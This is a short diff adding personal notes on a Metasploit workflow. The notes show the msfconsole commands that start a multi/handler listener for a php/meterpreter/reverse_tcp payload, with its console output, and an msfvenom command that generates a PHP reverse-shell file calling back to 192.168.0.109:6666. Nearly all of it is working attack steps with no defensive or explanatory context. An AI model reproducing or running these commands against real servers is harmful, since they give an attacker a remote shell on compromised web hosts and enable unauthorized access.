@@ -1,0 +1,21 @@
+# start postgresql
+# use msfconsole
+
+
+use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.0.109
+LHOST => 192.168.0.109
+msf6 exploit(multi/handler) > set LPORT 6666
+LPORT => 6666
+msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > exploit 
+
+[-] Handler failed to bind to 192.168.0.109:6666:-  -
+[*] Started reverse TCP handler on 0.0.0.0:6666 
+
+
+# after generate shell 
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=6666 -f raw>phpshellmetasploit.php
